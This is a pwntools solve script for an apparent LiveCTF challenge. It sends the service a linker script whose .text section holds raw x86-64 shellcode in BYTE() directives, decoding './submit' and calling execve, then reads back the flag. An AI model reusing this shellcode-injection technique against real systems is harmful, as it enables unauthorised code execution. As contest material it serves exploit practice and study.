#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
#context.log_level = 'debug'

p = remote(HOST, PORT) 

script = '''ENTRY(start)
phys = 0x00100000;
SECTIONS
{
  . = 0x400000;
  .text : {
    main = .;
    BYTE(0x68);BYTE(0x75);BYTE(0x64);BYTE(0x73);BYTE(0x1);BYTE(0x81);BYTE(0x34);BYTE(0x24);BYTE(0x1);BYTE(0x1);BYTE(0x1);BYTE(0x1);BYTE(0x48);BYTE(0xb8);BYTE(0x2e);BYTE(0x2f);BYTE(0x73);BYTE(0x75);BYTE(0x62);BYTE(0x6d);BYTE(0x69);BYTE(0x74);BYTE(0x50);BYTE(0x6a);BYTE(0x3b);BYTE(0x58);BYTE(0x48);BYTE(0x89);BYTE(0xe7);BYTE(0x31);BYTE(0xf6);BYTE(0x99);BYTE(0xf);BYTE(0x5);
  }
}

'''
p.sendline(script.encode())


flag = p.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
